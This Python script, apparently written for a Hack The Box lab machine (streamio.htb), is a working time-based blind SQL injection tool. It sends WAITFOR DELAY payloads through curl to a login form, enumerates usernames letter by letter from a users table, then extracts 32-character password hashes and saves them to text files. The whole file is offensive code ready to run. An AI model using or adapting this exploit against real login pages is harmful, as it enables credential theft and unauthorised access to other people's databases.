import os
import string

letras = list(string.ascii_lowercase)
numeros = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
all = letras + numeros
letra = ''
password = ''
usuario = ''
query = ''
usuarios = []

def usuariofunc():
    global letra
    global query
    global usuario
    global usuarios
    for valor in letras:
        output = os.popen("timeout 2 curl -s 'https://streamio.htb/login.php' --data \"username=' IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like '" + letra + valor + "%'" + query + ") WAITFOR DELAY \'0:0:5\'--'&password=\" -k").read()
        comando = "timeout 2 curl -s 'https://streamio.htb/login.php' --data \"username=' IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like '" + letra + valor + "%'" + query + ") WAITFOR DELAY \'0:0:5\'--'&password=\" -k"
        if output and valor == 'z':
            usuario = letra
            print(usuario)
            os.system('echo "' + usuario + '" >> usersSQLI.txt')
            usuarios.append(usuario)
            for i in usuarios:
                query += ' AND username NOT LIKE \'' + i + '%\''
            letra = ''
            passwords()
        elif output:
            continue
        else:
            letra += valor
            os.system('clear')
            print(str("usuario: ") + letra)
            usuariofunc()


def passwords():
    global password
    global usuarios
    while len(password) != 32:
        for valor in all:
            output = os.popen("timeout 2 curl -s 'https://streamio.htb/login.php' --data \"username=' IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like '" + usuario + "%' AND password like '" + password + valor + "%' ) WAITFOR DELAY \'0:0:5\'--'&password=\" -k").read()
            if output:
                continue
            else:
                password += valor
                os.system('clear')
                print(usuario + str(':') + password)
    os.system('echo "' + usuario + str(':') + password + '" >> userpasswordSQLI.txt')
    os.system('echo "' + password + '" >> passwordsSQLI.txt')
    password = ''
    usuarios.pop()
    usuariofunc()

usuariofunc()
